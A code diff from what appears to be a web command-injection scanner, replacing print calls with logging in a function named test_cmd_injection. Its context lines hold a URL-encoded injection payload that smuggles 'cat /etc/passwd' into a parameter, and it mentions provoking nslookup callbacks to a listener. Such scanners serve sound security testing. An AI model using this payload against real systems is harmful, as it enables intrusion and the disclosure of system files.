@@ -1,7 +1,7 @@
 from src.httpreqs.request import REQUEST
 from src.httpreqs.request import prepareRequest
 from src.configs.config import proxies
-from src.utils.arguments import args
+from src.utils.arguments import args, logging
 from src.servers.ICMPServer import ICMPThread
 from src.utils import colors
 from src.utils.stats import stats
@@ -27,7 +27,7 @@ def generate_random_alphanumeric():
 
 def test_cmd_injection(url, post):
     if(args.verbose):
-        print(colors.blue("[i]") + " Testing results-based OS command injection...")
+        logging.info(colors.blue("[i]") + " Testing results-based OS command injection...")
     
     cmdList = []
     cmdList.append("1%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%27%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%5C%22%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D")
@@ -49,7 +49,7 @@ def test_cmd_injection(url, post):
 
         if("nslookup" in cmdList[i] and args.verbose and not nslookupFlag):
             nslookupFlag = True
-            if(args.verbose): print(colors.blue("[i]") + " Trying to provoke an external callback to '" + args.callback + "'. Check your listener logs...")
+            if(args.verbose): logging.info(colors.blue("[i]") + " Trying to provoke an external callback to '" + args.callback + "'. Check your listener logs...")
 
         r, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "CMD")
 
